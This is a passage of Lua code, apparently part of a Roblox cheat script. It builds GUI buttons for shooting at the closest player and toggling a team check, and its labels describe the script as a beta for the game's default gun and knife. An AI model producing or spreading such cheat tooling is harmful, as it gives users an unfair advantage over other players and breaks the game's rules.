toggleTeamCheckButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleTeamCheckButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
toggleTeamCheckButton.BackgroundTransparency = 0.6
toggleTeamCheckButton.Draggable = true
toggleTeamCheckButton.BorderSizePixel = 0
toggleTeamCheckButton.Parent = screenGui

UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = button
UICorner.Parent = toggleTeamCheckButton

clickSound.SoundId = "rbxassetid://1673280232"
clickSound.Parent = button

local function onButtonPress()
    clickSound:Play()
    shootAtClosestPlayer()
end

local function onToggleTeamCheckButtonPress()
    isTeamCheckActive = not isTeamCheckActive
    if isTeamCheckActive then
        toggleTeamCheckButton.Text = "Disable Team Check"
    else
        toggleTeamCheckButton.Text = "Enable Team Check"
    end
end

button.MouseButton1Click:Connect(onButtonPress)
toggleTeamCheckButton.MouseButton1Click:Connect(onToggleTeamCheckButtonPress)
end)

CombateSection:NewButton("anchor Shoot gui", "ButtonInfo", function()
local existingGui = game:GetService("CoreGui"):FindFirstChild("mygui")
if not existingGui then
    return
end

local shootButton = existingGui:FindFirstChild("Button")
if shootButton then
    shootButton.Draggable = not shootButton.Draggable
end
end)

INFOSection:NewLabel("The script only works with the default Gun and Knife weapons in the game.")
INFOSection:NewLabel("This script is in beta and is not fully completed.")
INFOSection:NewLabel("Please refrain from leaving negative comments about it.")
